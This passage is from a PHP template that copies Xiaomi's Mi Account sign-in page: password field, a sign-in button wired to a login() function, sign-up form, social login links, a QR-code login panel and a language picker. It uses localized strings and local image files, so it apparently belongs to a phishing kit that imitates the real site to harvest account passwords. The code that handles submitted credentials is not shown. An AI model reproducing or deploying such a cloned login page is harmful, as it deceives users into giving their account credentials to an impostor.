                                    <path d="M19.78 7.738a.964.964 0 00-1.488-1.227 10.567 10.567 0 01-2.159 1.98 10.487 10.487 0 01-5.958 1.848 10.514 10.514 0 01-2.826-.381 10.394 10.394 0 01-1.977-.776 10.612 10.612 0 01-3.646-3.095.964.964 0 00-1.547 1.15c.487.655 1.037 1.26 1.642 1.808a.955.955 0 00-.084.17l-1.01 2.692a.964.964 0 101.806.677l.868-2.32a12.316 12.316 0 002.632 1.298l-.528 2.696a.964.964 0 101.893.371l.504-2.569c1.358.25 2.747.275 4.113.072l.44 2.417a.964.964 0 101.898-.346l-.455-2.502a12.37 12.37 0 002.381-1.029l.993 2.333a.964.964 0 001.775-.756l-1.139-2.673a12.537 12.537 0 001.871-1.838z"></path>
                                  </svg>
                                </div>
                                <div id="eyeopen" class="mi-password-field__adornment mi-input-adornment" style="display:none">
                                  <svg viewBox="0 0 20 20" width="1em" height="1em" fill="currentColor" class="mi-password-field__icon">
                                    <path d="M10 3c4.003 0 7.53 2.102 9.593 5.291a2.53 2.53 0 010 2.75c-2.063 3.19-5.59 5.292-9.593 5.292s-7.53-2.101-9.593-5.29a2.53 2.53 0 010-2.752C2.47 5.101 5.997 3 10 3zm-.012 2.333a4.337 4.337 0 00-4.34 4.334A4.337 4.337 0 009.988 14c2.397 0 4.34-1.94 4.34-4.333a4.337 4.337 0 00-4.34-4.334zm0 1.334a3.002 3.002 0 013.004 3c0 1.657-1.345 3-3.004 3a3.002 3.002 0 01-3.005-3c0-1.657 1.345-3 3.005-3z"></path>
                                  </svg>
                                </div>
                              </div>
                            </div>
                            <div id="passerror" class="mi-form-helper-text mi-form-helper-text--error" style="display:none"><?=$language['enter_password'][$lang];?></div>
                            <div id="loader" class="mi-form-helper-text mi-form-helper-text--error" style="text-align:center;display:none">
                              <img src="images/load.gif">
                            </div>
                            <div id="error" class="mi-form-helper-text mi-form-helper-text--error" style="display:none"><?=$language['incorrect'][$lang];?></div>
                            <button tabindex="-1" id="lbt" type="button" onclick="login()" disabled="" class="mi-button mi-button--fullwidth mi-button--disabled" style="margin-top: 20px; margin-bottom: 10px;"><?=$language['signin'][$lang];?></button>
                            <div class="mi-form-actions mi-form-actions--inline">
                              <div class="mi-form-action mi-form-action--start">
                                <a class="mi-link" href="https://account.xiaomi.com/pass/forgetPassword?sid=passport"><?=$language['forgot'][$lang];?></a>
                              </div>
                              <div style="display:none" class="mi-form-action mi-form-action--end">
                                <a class="mi-link" href="https://account.xiaomi.com/fe/service/login/phone?_uRegion=VI"><?=$language['sign_phone'][$lang];?></a>
                              </div>
                            </div>
                          </div>
                          <div class="mi-sns-login">
                            <div class="mi-sns-login__title"><?=$language['options'][$lang];?></div>
                            <div class="mi-sns-login__content">
                              <div class="mi-sns-login__list">
                                <div class="mi-sns-login__item">
                                  <a href="https://account.xiaomi.com/pass/sns/login/auth?appid=222161937813280&amp;callback=https%3A%2F%2Faccount.xiaomi.com&amp;sid=passport&amp;_new=true" class="mi-sns-login__icon" title="Sign in with Facebook">
                                    <svg viewBox="0 0 46 46">
                                      <path d="M22.865.004C10.244.004.013 10.236.013 22.856s10.232 22.852 22.852 22.852c12.622 0 22.852-10.232 22.852-22.852S35.486.004 22.865.004zm5.667 14.07H25.23c-1.33 0-1.724.295-1.724 1.626v4.186h4.679v4.31h-4.68v12.04h-4.408v-12.04h-3.915v-4.31h3.915v-6.01c0-.996.44-1.918 1.321-2.765.813-.782 2.039-1.174 3.676-1.174h4.438v4.137z" fill="#5470BD" fill-rule="nonzero"></path>
                                    </svg>
                                  </a>
                                </div>
                                <div class="mi-sns-login__item">
                                  <a href="https://account.xiaomi.com/pass/sns/login/auth?appid=google&amp;callback=https%3A%2F%2Faccount.xiaomi.com&amp;sid=passport&amp;_new=true" class="mi-sns-login__icon" title="Sign in with Google">
                                    <svg viewBox="0 0 46 46">
                                      <g fill-rule="nonzero" fill="none">
                                        <path d="M9.577 23.156c0-1.504.253-2.946.702-4.299L2.4 12.9A22.958 22.958 0 000 23.156c0 3.686.863 7.162 2.397 10.25l7.875-5.97a13.57 13.57 0 01-.695-4.28" fill="#FBBC05"></path>
                                        <path d="M23.415 9.476a13.627 13.627 0 018.62 3.05l6.81-6.735c-4.15-3.576-9.47-5.788-15.43-5.788C14.162.003 6.209 5.243 2.4 12.9l7.883 5.959c1.815-5.458 6.99-9.383 13.133-9.383" fill="#EA4335"></path>
                                        <path d="M23.515 36.532c-6.176 0-11.376-3.9-13.202-9.324L2.395 33.13c3.826 7.609 11.82 12.814 21.12 12.814 5.738 0 11.216-1.994 15.33-5.734l-7.517-5.69c-2.12 1.308-4.791 2.013-7.814 2.013" fill="#34A853"></path>
                                        <path d="M45.975 22.938c0-1.36-.215-2.824-.535-4.184H23.513v8.89h12.62c-.629 3.031-2.346 5.361-4.804 6.877l7.516 5.69c4.32-3.925 7.13-9.773 7.13-17.273" fill="#4285F4"></path>
                                      </g>
                                    </svg>
                                  </a>
                                </div>
                              </div>
                            </div>
                          </div>
                        </form>
                        <form class="mi-form mi-form--terms" id="signupform" style="display:none">
                          <div class="mi-form__content">
                            <div class="mi-select-field mi-form-field mi-form-field--fullwidth mi-form-field--bordered">
                              <div class="mi-form-field__field">
                                <div class="mi-form-field__control">
                                  <div class="mi-select ant-select ant-select-enabled">
                                    <div class="ant-select-selection
            ant-select-selection--single" role="combobox" aria-autocomplete="list" aria-haspopup="true" aria-controls="15272e05-7175-4eef-e06c-e7ac216bf722" tabindex="0">
                                      <div class="ant-select-selection__rendered">
                                        <div class="ant-select-selection-selected-value" title="U.S. Virgin Islands" style="display: block; opacity: 1;">U.S. Virgin Islands</div>
                                      </div>
                                      <span class="ant-select-arrow" unselectable="on" style="user-select: none;">
                                        <i class="anticon ant-select-arrow-icon">
                                          <svg viewBox="0 0 20 20" width="1em" height="1em" fill="currentColor" aria-hidden="true" focusable="false" class="">
                                            <path d="M4 7l6 6.667L16 7" stroke="currentColor" stroke-width="1.5" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path>
                                          </svg>
                                        </i>
                                      </span>
                                    </div>
                                  </div>
                                  <label class="mi-floating-label mi-floating-label--float-above"><?=$language['region'][$lang];?></label>
                                </div>
                              </div>
                            </div>
                            <div class="mi-text-field mi-form-field mi-form-field--bordered" style="margin-top: 20px;">
                              <div class="mi-form-field__field">
                                <div class="mi-form-field__control">
                                  <div class="mi-text-field__input mi-input">
                                    <input id="signupemail" name="email" class="mi-input__input" value="">
                                    <label id="lsignupemail" class="mi-floating-label"><?=$language['email'][$lang];?></label>
                                  </div>
                                </div>
                              </div>
                            </div>
                            <button tabindex="-1" type="submit" disabled="" class="mi-button mi-button--primary mi-button--fullwidth mi-button--disabled" style="margin-top: 20px; margin-bottom: 10px;"><?=$language['next'][$lang];?></button>
                            <div class="mi-form-actions">
                              <div class="mi-form-action mi-form-action--end">
                                <a class="mi-link" href="https://account.xiaomi.com/fe/service/register/phone?_uRegion=VI"><?=$language['create_phone'][$lang];?> </a>
                              </div>
                            </div>
                          </div>
                          <div class="mi-accept-terms"><?=$language['read'][$lang];?> <a target="_blank" href="/about/protocol/agreement"><?=$language['agreement'][$lang];?></a> <?=$language['and'][$lang];?> <a target="_blank" href="/about/protocol/privacy"><?=$language['policy'][$lang];?></a>. </div>
                          <div class="mi-sns-login">
                            <div class="mi-sns-login__title"><?=$language['options'][$lang];?></div>
                            <div class="mi-sns-login__content">
                              <div class="mi-sns-login__list">
                                <div class="mi-sns-login__item">
                                  <a href="/pass/sns/login/auth?appid=222161937813280&amp;callback=https%3A%2F%2Faccount.xiaomi.com&amp;sid=passport&amp;_new=true" class="mi-sns-login__icon" title="Sign in with Facebook">
                                    <svg viewBox="0 0 46 46">
                                      <path d="M22.865.004C10.244.004.013 10.236.013 22.856s10.232 22.852 22.852 22.852c12.622 0 22.852-10.232 22.852-22.852S35.486.004 22.865.004zm5.667 14.07H25.23c-1.33 0-1.724.295-1.724 1.626v4.186h4.679v4.31h-4.68v12.04h-4.408v-12.04h-3.915v-4.31h3.915v-6.01c0-.996.44-1.918 1.321-2.765.813-.782 2.039-1.174 3.676-1.174h4.438v4.137z" fill="#5470BD" fill-rule="nonzero"></path>
                                    </svg>
                                  </a>
                                </div>
                                <div class="mi-sns-login__item">
                                  <a href="/pass/sns/login/auth?appid=google&amp;callback=https%3A%2F%2Faccount.xiaomi.com&amp;sid=passport&amp;_new=true" class="mi-sns-login__icon" title="Sign in with Google">
                                    <svg viewBox="0 0 46 46">
                                      <g fill-rule="nonzero" fill="none">
                                        <path d="M9.577 23.156c0-1.504.253-2.946.702-4.299L2.4 12.9A22.958 22.958 0 000 23.156c0 3.686.863 7.162 2.397 10.25l7.875-5.97a13.57 13.57 0 01-.695-4.28" fill="#FBBC05"></path>
                                        <path d="M23.415 9.476a13.627 13.627 0 018.62 3.05l6.81-6.735c-4.15-3.576-9.47-5.788-15.43-5.788C14.162.003 6.209 5.243 2.4 12.9l7.883 5.959c1.815-5.458 6.99-9.383 13.133-9.383" fill="#EA4335"></path>
                                        <path d="M23.515 36.532c-6.176 0-11.376-3.9-13.202-9.324L2.395 33.13c3.826 7.609 11.82 12.814 21.12 12.814 5.738 0 11.216-1.994 15.33-5.734l-7.517-5.69c-2.12 1.308-4.791 2.013-7.814 2.013" fill="#34A853"></path>
                                        <path d="M45.975 22.938c0-1.36-.215-2.824-.535-4.184H23.513v8.89h12.62c-.629 3.031-2.346 5.361-4.804 6.877l7.516 5.69c4.32-3.925 7.13-9.773 7.13-17.273" fill="#4285F4"></path>
                                      </g>
                                    </svg>
                                  </a>
                                </div>
                              </div>
                            </div>
                          </div>
                        </form>
                        <div tabindex="0" role="presentation" style="width: 0px; height: 0px; overflow: hidden; position: absolute;"></div>
                      </div>
                      <div role="tabpanel" aria-hidden="true" class="ant-tabs-tabpane ant-tabs-tabpane-inactive"></div>
                    </div>
                    <div tabindex="0" role="presentation" style="width: 0px; height: 0px; overflow: hidden; position: absolute;"></div>
                  </div>
                </div>
                <div class="mi-layout__card" id="barlay" style="display:none">
                  <div class="mi-qr-login-switch" style="">
                    <i class="anticon mi-qr-login-switch__icon">
                      <svg width="1em" height="1em" fill="currentColor" aria-hidden="true" focusable="false" class="">
                        <g fill="#FFF" fill-rule="nonzero">
                          <path d="M2.44 13.4L0 10.79V3.164S0 .5 2.542.5h30.915s2.593 0 2.542 2.664v23.293s0 2.611-2.542 2.611H22.932l.101 5.432-7.88-8.043h18.304V3.164H2.44V13.4z"></path>
                          <path d="M8 18.082V7.5h20.513v14.754H11.797L8 18.082zm15.286 15.976h6.903s1.825 1.22 0 2.442h-4.536l-2.367-2.442z"></path>
                        </g>
                      </svg>
                    </i>
                  </div>
                  <div class="mi-scan-code-login">
                    <div class="mi-scan-code-login__title">Scan QR code to sign in</div>
                    <div params="[object Object]" class="mi-login-qrcode" style="width: 240px; height: 240px;">
                      <img src="images/bar.png" width="240px" height="240px">
                    </div>
                    <div class="mi-scan-code-login__tips">
                      <div class="mi-center-text">
                        <div class="mi-center-text__content">Go to Settings &gt; Mi Account on your Mi Phone and tap the Scanner icon to sign in using a QR code. <i aria-label="icon: question-circle" class="anticon anticon-question-circle mi-scan-code-login__question-icon">
                            <svg viewBox="64 64 896 896" focusable="false" class="" data-icon="question-circle" width="1em" height="1em" fill="currentColor" aria-hidden="true">
                              <path d="M512 64C264.6 64 64 264.6 64 512s200.6 448 448 448 448-200.6 448-448S759.4 64 512 64zm0 708c-22.1 0-40-17.9-40-40s17.9-40 40-40 40 17.9 40 40-17.9 40-40 40zm62.9-219.5a48.3 48.3 0 0 0-30.9 44.8V620c0 4.4-3.6 8-8 8h-48c-4.4 0-8-3.6-8-8v-21.5c0-23.1 6.7-45.9 19.9-64.9 12.9-18.6 30.9-32.8 52.1-40.9 34-13.1 56-41.6 56-72.7 0-44.1-43.1-80-96-80s-96 35.9-96 80v7.6c0 4.4-3.6 8-8 8h-48c-4.4 0-8-3.6-8-8V420c0-39.3 17.2-76 48.4-103.3C430.4 290.4 470 276 512 276s81.6 14.5 111.6 40.7C654.8 344 672 380.7 672 420c0 57.8-38.1 109.8-97.1 132.5z"></path>
                            </svg>
                          </i>
                        </div>
                      </div>
                    </div>
                    <div class="mi-scan-app">
                      <div class="mi-scan-app__title">Apps with a supported QR code scanner</div>
                      <div class="mi-scan-app__list">
                        <a class="mi-scan-app__item" href="https://g.home.mi.com/views/download-mihome.html" target="_blank" rel="noopener noreferrer">
                          <div class="mi-scan-app__icon">
                            <svg width="46px" height="46px" viewBox="0 0 46 46">
                              <defs>
                                <rect id="path-1" x="0" y="0" width="46" height="46" rx="8"></rect>
                              </defs>
                              <g id="\u7EC8\u7A3F_0827" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                <g id="3-6_\u5207\u6362\u8BED\u8A00_hover\u72B6\u6001" transform="translate(-429.000000, -658.000000)">
                                  <g id="\u767B\u5F55\u6846" transform="translate(308.000000, 150.000000)">
                                    <g id="\u5C0F\u7C73\u65D7\u4E0BAPP" transform="translate(121.000000, 458.000000)">
                                      <g id="\u5176\u4ED6\u767B\u5F55\u65B9\u5F0F\u56FE\u6807" transform="translate(0.000000, 50.000000)">
                                        <g id="\u7C73\u5BB6">
                                          <mask id="mask-2" fill="white">
                                            <use xlink:href="#path-1"></use>
                                          </mask>
                                          <use id="\u8499\u7248" fill="#48B885" xlink:href="#path-1"></use>
                                          <g id="mijia_huaban" mask="url(#mask-2)" fill="#FFFFFF" fill-rule="nonzero">
                                            <g transform="translate(12.000000, 11.000000)" id="\u5F62\u72B6">
                                              <path d="M17.9050144,10.3422007 L17.9050144,12.6892382 C17.9050144,16.3385732 14.9116922,19.2950423 11.2168675,19.2950423 C8.45125812,19.2950423 6.07863709,17.637243 5.06127482,15.2720677 L0.88898767,16.8754534 C2.43155862,21.0326481 6.47529819,24 11.2168675,24 C17.2916588,24 22.2168675,19.1354293 22.2168675,13.1354293 L22.2168675,8.68440145 L17.9050144,10.3422007 Z M4.53973892,12.8814994 C4.53606613,12.8162031 4.52872056,12.7545345 4.52872056,12.6892382 L4.52872056,4.70495768 L11.2168675,7.29866989 L17.9050144,4.70495768 L17.9050144,7.74848851 L22.2168675,6.09431681 L22.2168675,0 L17.0161997,0 L11.051592,2.59371221 L5.08698433,0 L0.21686747,0 L0.21686747,13.1318017 C0.21686747,13.5961306 0.249922562,14.0532044 0.308687169,14.503023 L4.53973892,12.8814994 L4.53973892,12.8814994 Z"></path>
                                            </g>
                                          </g>
                                        </g>
                                      </g>
                                    </g>
                                  </g>
                                </g>
                              </g>
                            </svg>
                          </div>
                          <div class="mi-scan-app__text">Mi Home</div>
                        </a>
                        <a class="mi-scan-app__item" href="https://www.mi.com/appdownload/" target="_blank" rel="noopener noreferrer">
                          <div class="mi-scan-app__icon">
                            <svg width="46px" height="46px" viewBox="0 0 46 46">
                              <defs>
                                <rect id="path-1" x="0" y="0" width="46" height="46" rx="8"></rect>
                              </defs>
                              <g id="\u7EC8\u7A3F_0827" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                <g id="3-6_\u5207\u6362\u8BED\u8A00_hover\u72B6\u6001" transform="translate(-510.000000, -658.000000)">
                                  <g id="\u767B\u5F55\u6846" transform="translate(308.000000, 150.000000)">
                                    <g id="\u5C0F\u7C73\u65D7\u4E0BAPP" transform="translate(121.000000, 458.000000)">
                                      <g id="\u5176\u4ED6\u767B\u5F55\u65B9\u5F0F\u56FE\u6807" transform="translate(0.000000, 50.000000)">
                                        <g id="\u5C0F\u7C73\u5546\u57CE" transform="translate(81.000000, 0.000000)">
                                          <mask id="mask-2" fill="white">
                                            <use xlink:href="#path-1"></use>
                                          </mask>
                                          <use id="\u8499\u7248" fill="#D8D8D8" xlink:href="#path-1"></use>
                                          <g id="Mi-logo" mask="url(#mask-2)">
                                            <g transform="translate(-2.000000, -2.000000)">
                                              <path d="M48.1018736,50 L1.89763641,50 C0.850090154,50 0,49.1503998 0,48.1018736 L0,1.89812637 C0,0.849600188 0.850090154,0 1.89763641,0 L48.1018736,0 C49.1499098,0 50,0.849600188 50,1.89812637 L50,48.1018736 C50,49.1503998 49.1499098,50 48.1018736,50" id="Fill-1" fill="#FF6900"></path>
                                              <path d="M36.2574032,17.5490196 L33.0886099,17.5490196 C32.9525412,17.5490196 32.8431373,17.6567368 32.8431373,17.7895228 L32.8431373,32.4077307 C32.8431373,32.5393416 32.9525412,32.6470588 33.0886099,32.6470588 L36.2574032,32.6470588 C36.3919034,32.6470588 36.503268,32.5393416 36.503268,32.4077307 L36.503268,17.7895228 C36.503268,17.6567368 36.3919034,17.5490196 36.2574032,17.5490196" id="Fill-3" fill="#FFFFFF"></path>
                                              <path d="M26.1068221,17.5490196 L13.4800626,17.5490196 C13.3443416,17.5490196 13.2352941,17.6567368 13.2352941,17.7895228 L13.2352941,32.4077307 C13.2352941,32.5393416 13.3443416,32.6470588 13.4800626,32.6470588 L16.6506776,32.6470588 C16.7860064,32.6470588 16.8970152,32.5393416 16.8970152,32.4077307 L16.8970152,21.0731358 C16.8970152,20.9423083 17.0064549,20.8338077 17.1421759,20.8338077 L24.6040848,20.8338077 C25.8330266,20.8338077 26.437495,21.8396908 26.437495,22.7280642 L26.437495,32.4077307 C26.437495,32.5393416 26.5481115,32.6470588 26.6838325,32.6470588 L29.8524862,32.6470588 C29.9874227,32.6470588 30.0980392,32.5393416 30.0980392,32.4077307 L30.0980392,21.5494418 C30.0980392,19.4699117 28.3889746,17.5490196 26.1068221,17.5490196" id="Fill-5" fill="#FFFFFF"></path>
                                              <path d="M23.327533,23.4313725 L20.1384772,23.4313725 C20.0084715,23.4313725 19.9019608,23.5349827 19.9019608,23.6617482 L19.9019608,32.0902783 C19.9019608,32.2166513 20.0084715,32.3202614 20.1384772,32.3202614 L23.327533,32.3202614 C23.456364,32.3202614 23.5620915,32.2166513 23.5620915,32.0902783 L23.5620915,23.6617482 C23.5620915,23.5349827 23.456364,23.4313725 23.327533,23.4313725" id="Fill-7" fill="#FFFFFF"></path>
                                            </g>
                                          </g>
                                        </g>
                                      </g>
                                    </g>
                                  </g>
                                </g>
                              </g>
                            </svg>
                          </div>
                          <div class="mi-scan-app__text">Mi Store</div>
                        </a>
                        <a class="mi-scan-app__item" href="https://mina.mi.com/download" target="_blank" rel="noopener noreferrer">
                          <div class="mi-scan-app__icon">
                            <svg width="46px" height="46px" viewBox="0 0 46 46">
                              <defs>
                                <linearGradient x1="94.9279785%" y1="97.9675293%" x2="24.7497559%" y2="27.6031494%" id="linearGradient-1">
                                  <stop stop-color="#FF5F10" offset="0%"></stop>
                                  <stop stop-color="#FF1435" offset="100%"></stop>
                                </linearGradient>
                                <rect id="path-2" x="0" y="0" width="46" height="46" rx="8"></rect>
                                <radialGradient cx="83.9375386%" cy="69.4076885%" fx="83.9375386%" fy="69.4076885%" r="49.7152841%" gradientTransform="translate(0.839375,0.694077),scale(0.982581,1.000000),rotate(-126.333118),translate(-0.839375,-0.694077)" id="radialGradient-4">
                                  <stop stop-color="#F63A47" stop-opacity="0.6" offset="0%"></stop>
                                  <stop stop-color="#F63A47" stop-opacity="0" offset="100%"></stop>
                                </radialGradient>
                                <radialGradient cx="88.7661192%" cy="24.2752628%" fx="88.7661192%" fy="24.2752628%" r="45.5737585%" gradientTransform="translate(0.887661,0.242753),scale(0.982581,1.000000),rotate(-128.292260),translate(-0.887661,-0.242753)" id="radialGradient-5">
                                  <stop stop-color="#F63A47" stop-opacity="0.6" offset="0%"></stop>
                                  <stop stop-color="#F63A47" stop-opacity="0" offset="100%"></stop>
                                </radialGradient>
                                <path d="M15.0095081,18.2593425 C15.1606056,17.9738993 18.2162336,12.2204811 18.6069502,11.0101175 C19.2633058,8.97685637 20.9018597,8.34837711 22.2005718,9.18569905 C24.0538848,10.3805902 24.9060982,13.823554 29.0522527,13.823554 C29.4799152,13.823554 29.1974069,13.3545223 29.1974069,13.3545223 C29.1974069,13.3545223 28.177121,12.3971289 27.1281572,10.8193267 C25.3107955,8.0857365 22.8544217,4.0842152 21.4902794,4.24928219 C19.338767,4.50962427 14.3364303,19.5308758 15.0095081,18.2593425 Z" id="path-6"></path>
                                <radialGradient cx="58.8986198%" cy="25.3377409%" fx="58.8986198%" fy="25.3377409%" r="46.0550546%" gradientTransform="translate(0.588986,0.253377),scale(1.000000,0.930744),rotate(-130.839820),translate(-0.588986,-0.253377)" id="radialGradient-7">
                                  <stop stop-color="#F63A47" stop-opacity="0.6" offset="0%"></stop>
                                  <stop stop-color="#F63A47" stop-opacity="0" offset="100%"></stop>
                                </radialGradient>
                                <path d="M5.78991199,10.0798212 C6.28705714,9.47326561 4.55264419,11.8571767 4.55264419,11.8571767 C8.61522367,11.8571767 9.9139496,7.06708402 11.8095114,5.97491777 C12.8117193,5.39747547 14.4929696,5.81749514 15.2172147,7.55546362 C16.8046987,11.364944 18.508639,17.9395414 21.5004429,19.2243341 C21.5004429,19.2243341 19.4384934,16.1933693 19.6127041,16.5424573 C19.6127041,16.5424573 15.2527605,1.01545842 12.176563,1.01545842 C9.1003655,1.01545842 5.78991199,10.0798212 5.78991199,10.0798212 Z" id="path-8"></path>
                                <linearGradient x1="0%" y1="50%" x2="96.1012246%" y2="50%" id="linearGradient-9">
                                  <stop stop-color="#FF451C" stop-opacity="0.611950861" offset="0%"></stop>
                                  <stop stop-color="#FFFFFF" offset="15.4296875%"></stop>
                                  <stop stop-color="#FFFFFF" offset="85.4711416%"></stop>
                                  <stop stop-color="#F63A47" stop-opacity="0.52697577" offset="100%"></stop>
                                </linearGradient>
                              </defs>
                              <g id="\u7EC8\u7A3F_0827" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                <g id="3-6_\u5207\u6362\u8BED\u8A00_hover\u72B6\u6001" transform="translate(-591.000000, -658.000000)">
                                  <g id="\u767B\u5F55\u6846" transform="translate(308.000000, 150.000000)">
                                    <g id="\u5C0F\u7C73\u65D7\u4E0BAPP" transform="translate(121.000000, 458.000000)">
                                      <g id="\u5176\u4ED6\u767B\u5F55\u65B9\u5F0F\u56FE\u6807" transform="translate(0.000000, 50.000000)">
                                        <g id="\u5C0F\u7231\u97F3\u7BB1" transform="translate(162.000000, 0.000000)">
                                          <g>
                                            <mask id="mask-3" fill="white">
                                              <use xlink:href="#path-2"></use>
                                            </mask>
                                            <use id="Mask-Copy" fill="url(#linearGradient-1)" xlink:href="#path-2"></use>
                                            <g id="Group" mask="url(#mask-3)">
                                              <g transform="translate(22.585714, 22.068571) scale(-1, -1) translate(-22.585714, -22.068571) translate(5.085714, 12.068571)">
                                                <g id="Path-4-Copy-2" stroke="none" opacity="0.300000012" transform="translate(22.118331, 11.290029) scale(1, -1) translate(-22.118331, -11.290029) " fill-rule="evenodd">
                                                  <use fill="#FFFFFF" xlink:href="#path-6"></use>
                                                  <use fill="url(#radialGradient-4)" xlink:href="#path-6"></use>
                                                  <use fill="url(#radialGradient-5)" xlink:href="#path-6"></use>
                                                </g>
                                                <g id="Path-4" stroke="none" opacity="0.300000012" fill-rule="evenodd">
                                                  <use fill="#FFFFFF" xlink:href="#path-8"></use>
                                                  <use fill="url(#radialGradient-7)" xlink:href="#path-8"></use>
                                                </g>
                                                <path d="M-7.47084934e-15,10.887915 C1.00591246,10.8782171 3.53756145,10.869866 4.39216274,10.869866 C7.44894432,10.869866 8.45493505,0.989380093 12.2316775,0.989380093 C16.00842,0.989380093 17.7040733,17.7177621 21.5089055,18.2210834 C25.3137376,18.7244047 25.7820866,9.74428484 29.1423015,9.74428484 C32.5025163,9.74428484 29.2757368,9.72678723 34.9580966,9.74428484" id="Path-2" stroke="url(#linearGradient-9)" stroke-width="2.89142857"></path>
                                              </g>
                                            </g>
                                          </g>
                                        </g>
                                      </g>
                                    </g>
                                  </g>
                                </g>
                              </g>
                            </svg>
                          </div>
                          <div class="mi-scan-app__text">Mi AI Speaker</div>
                        </a>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div class="mi-copyright">Xiaomi Inc., <?=$language['rights'][$lang];?></div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="miverify_wind" style="display: none;">
      <div class="miverify_panel_ghost"></div>
      <div class="miverify_panel_box loading">
        <div class="miverify_panel_loading">
          <div class="miverify_panel_loading_icon"></div>
          <span class="miverify_panel_loading_content">Environmental safety testing...</span>
        </div>
        <div class="miverify_panel_error">
          <p class="miverify_panel_error_title">prompt</p>
          <div class="miverify_panel_error_content"></div>
          <div class="miverify_error_footer_panel" style="display:none;">
            <button class="miverify_cancel_btn">Cancel</button>
            <button class="miverify_ok_btn miverify_refresh_btn">Retry</button>
          </div>
        </div>
        <div class="miverify_panel_next">
          <div class="miverify_wrap">
            <div class="miverify_widget">
              <div class="miverify_window"></div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div style="position: absolute; top: 0px; left: 0px; width: 100%;">
      <div>
        <div class="ant-popover mi-qr-login-switch__popover ant-popover-placement-left  ant-popover-hidden" style="left: 646px; top: 126px; transform-origin: 135.391px 50%;">
          <div class="ant-popover-content">
            <div class="ant-popover-arrow"></div>
            <div class="ant-popover-inner" role="tooltip">
              <div>
                <div class="ant-popover-inner-content">Scan QR code</div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div role="document" class="ant-modal mi-language-picker__modal" style="width: 960px; transform-origin: 869.5px -41.5px;">
      <div tabindex="0" aria-hidden="true" style="width: 0px; height: 0px; overflow: hidden; outline: none;"></div>
      <div class="ant-modal-content" style="display:none">
        <button type="button" aria-label="Close" class="ant-modal-close">
          <span class="ant-modal-close-x">
            <i class="anticon">
              <svg viewBox="0 0 20 20" width="1em" height="1em" fill="currentColor" aria-hidden="true" focusable="false" class="">
                <g fill="none" fill-rule="evenodd">
                  <path d="M0 10.005C0 4.477 4.48 0 10 0s10 4.477 10 9.995v.01a9.982 9.982 0 01-2.926 7.07A9.992 9.992 0 0110 20c-5.53 0-10-4.477-10-9.995z" fill="currentColor" fill-rule="nonzero"></path>
                  <path d="M13.536 6.464a.833.833 0 010 1.179l-2.358 2.356 2.358 2.358a.833.833 0 01-1.179 1.179l-2.358-2.358-2.356 2.358a.833.833 0 01-1.179-1.179l2.357-2.358-2.357-2.356a.833.833 0 011.179-1.179l2.356 2.357 2.358-2.357a.833.833 0 011.179 0z" fill="#FFF"></path>
                </g>
              </svg>
            </i>
          </span>
        </button>
        <div class="ant-modal-header">
          <div class="ant-modal-title" id="rcDialogTitle0">Select Your Language</div>
        </div>
        <div class="ant-modal-body">
          <div class="mi-language-picker__scroll">
            <div class="mi-language-picker__list">
              <div class="mi-language-picker__item" title="&lrm;中文(简体)&lrm;">&lrm;中文(简体)&lrm;</div>
              <div class="mi-language-picker__item" title="&lrm;&lrm;中文(繁體)&lrm;">&lrm;&lrm;中文(繁體)&lrm;</div>
              <div class="mi-language-picker__item mi-language-picker__item--selected" title="&lrm;English">&lrm;English</div>
              <div class="mi-language-picker__item" title="한국어">한국어</div>
              <div class="mi-language-picker__item" title="Português (Brasil)&lrm;">Português (Brasil)&lrm;</div>
              <div class="mi-language-picker__item" title="Bahasa Indonesia">Bahasa Indonesia</div>
              <div class="mi-language-picker__item" title="हिन्दी">हिन्दी</div>
              <div class="mi-language-picker__item" title="தமிழ்">தமிழ்</div>
              <div class="mi-language-picker__item" title="తెలుగు">తెలుగు</div>
              <div class="mi-language-picker__item" title="ಕನ್ನಡ">ಕನ್ನಡ</div>
              <div class="mi-language-picker__item" title="मराठी">मराठी</div>
              <div class="mi-language-picker__item" title="മലയാളം">മലയാളം</div>
              <div class="mi-language-picker__item" title="বাংলা">বাংলা</div>
              <div class="mi-language-picker__item" title="ภาษาไทย">ภาษาไทย</div>
              <div class="mi-language-picker__item" title="Tiếng Việt">Tiếng Việt</div>
              <div class="mi-language-picker__item" title="Bahasa Melayu">Bahasa Melayu</div>
              <div class="mi-language-picker__item" title="Türkçe">Türkçe</div>
              <div class="mi-language-picker__item" title="العربية">العربية</div>
              <div class="mi-language-picker__item" title="Русский">Русский</div>
              <div class="mi-language-picker__item" title="Español (América)&lrm;">Español (América)&lrm;</div>
              <div class="mi-language-picker__item" title="Українська">Українська</div>
              <div class="mi-language-picker__item" title="O'zbekcha">O'zbekcha</div>
              <div class="mi-language-picker__item" title="অসমীয়া">অসমীয়া</div>
              <div class="mi-language-picker__item" title="فارسی">فارسی</div>
              <div class="mi-language-picker__item" title="Français">Français</div>
              <div class="mi-language-picker__item" title="Italiano">Italiano</div>
              <div class="mi-language-picker__item" title="עברית">עברית</div>
              <div class="mi-language-picker__item" title="ဗမာ">ဗမာ</div>
              <div class="mi-language-picker__item" title="Polski">Polski</div>
              <div class="mi-language-picker__item" title="Español (España)&lrm;">Español (España)&lrm;</div>
              <div class="mi-language-picker__item" title="Čeština">Čeština</div>
              <div class="mi-language-picker__item" title="Ελληνικά">Ελληνικά</div>
              <div class="mi-language-picker__item" title="Nederlands">Nederlands</div>
              <div class="mi-language-picker__item" title="Deutsch">Deutsch</div>
              <div class="mi-language-picker__item" title="日本語&lrm;">日本語&lrm;</div>
              <div class="mi-language-picker__item" title="Bosanski&lrm;">Bosanski&lrm;</div>
              <div class="mi-language-picker__item" title="Hrvatski">Hrvatski</div>
              <div class="mi-language-picker__item" title="Suomi">Suomi</div>
              <div class="mi-language-picker__item" title="Latviešu">Latviešu</div>
              <div class="mi-language-picker__item" title="नेपाली">नेपाली</div>
              <div class="mi-language-picker__item" title="Português (Portugal)">Português (Portugal)</div>
              <div class="mi-language-picker__item" title="Română">Română</div>
              <div class="mi-language-picker__item" title="Српски">Српски</div>
              <div class="mi-language-picker__item" title="Slovenčina">Slovenčina</div>
              <div class="mi-language-picker__item" title="Slovenščina">Slovenščina</div>
